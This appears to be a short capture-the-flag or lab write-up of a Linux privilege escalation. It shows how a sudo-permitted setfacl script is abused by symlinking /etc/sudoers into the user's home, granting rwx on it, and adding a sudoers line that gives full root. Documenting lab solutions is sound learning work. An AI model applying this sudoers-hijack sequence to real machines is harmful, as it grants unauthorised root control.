```bash
sudo -l
```
![[Pasted image 20241017122134.png]]

User mtz can run /opt/acl.sh that utilises `setfacl` as SUDO to change file permissions on all files for any user within /home/mtz folder. This can be exploited to create a symlink to a target file of choice and assign RWX permissions to `mtz` which will allow us to modify the contents of the file

- Create a SYMLINK to `/etc/sudoers`
```bash
ln -s /etc/sudoers /home/mtz/xsc
```
- Give permissions
```bash
sudo /opt/acl.sh mtz rwx xsc
```
- Edit the file
```bash
nano xsc
```
```
mtz (ALL:ALL) ALL
```
- Switch to root
```bash
sudo su
```
Enter password and we are root!